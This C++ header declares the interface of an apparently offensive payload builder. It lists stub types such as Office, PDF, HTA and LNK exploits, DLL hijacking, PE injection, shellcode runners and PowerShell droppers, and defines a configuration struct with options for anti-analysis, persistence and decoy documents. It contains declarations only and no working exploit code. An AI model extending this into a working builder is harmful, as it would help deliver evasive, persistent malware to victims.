#ifndef STUB_TYPES_H
#define STUB_TYPES_H

#include <vector>
#include <string>
#include <cstdint>
#include <map> // Added missing include for std::map

/**
 * Enumeration of supported stub/exploit types
 */
enum class StubType {
    XLL_EXPLOIT,           // Excel XLL Add-in exploit
    DOC_XLS_EXPLOIT,       // Office Document (DOC/XLS) exploit  
    PDF_EXPLOIT,           // PDF document exploit
    RTF_EXPLOIT,           // Rich Text Format exploit
    MACRO_EXPLOIT,         // VBA/Office macro exploit
    DLL_HIJACK,            // DLL hijacking payload
    PE_INJECTION,          // PE injection payload
    SHELLCODE_RUNNER,      // Generic shellcode runner
    POWERSHELL_DROPPER,    // PowerShell-based dropper
    BATCH_DROPPER,         // Batch file dropper
    JAVASCRIPT_EXPLOIT,    // JavaScript-based exploit
    HTA_EXPLOIT,           // HTML Application exploit
    SCT_EXPLOIT,           // Script Component File exploit
    LNK_EXPLOIT,           // Windows shortcut file exploit
    CHM_EXPLOIT,           // Compiled HTML Help exploit
    CUSTOM_STUB            // Custom user-defined stub
};

/**
 * Structure to hold exploit payload generation parameters
 */
struct ExploitConfig {
    StubType type;
    std::string targetArchitecture;  // x86, x64, any
    std::string payloadPath;         // Path to the payload to embed
    std::string outputPath;          // Output file path
    std::vector<uint8_t> encryptionKey; // Optional encryption key
    bool enableAntiAnalysis;         // Enable anti-analysis features
    bool enablePersistence;          // Enable persistence mechanisms
    std::string decoyDocument;       // Optional decoy document path
    std::map<std::string, std::string> customParameters; // Additional parameters
};

/**
 * Generate exploit payload based on specified stub type and configuration
 * 
 * @param config The exploit configuration containing all necessary parameters
 * @return true if payload generation was successful, false otherwise
 */
bool generate_exploit_payload(const ExploitConfig& config);

/**
 * Get human-readable name for a stub type
 * 
 * @param type The stub type enum value
 * @return String description of the stub type
 */
std::string get_stub_type_name(StubType type);

/**
 * Parse stub type from string representation
 * 
 * @param typeStr String representation of stub type
 * @return StubType enum value, or CUSTOM_STUB if not recognized
 */
StubType parse_stub_type(const std::string& typeStr);

/**
 * Get list of all supported stub types
 * 
 * @return Vector containing all available stub types
 */
std::vector<StubType> get_supported_stub_types();

#endif // STUB_TYPES_H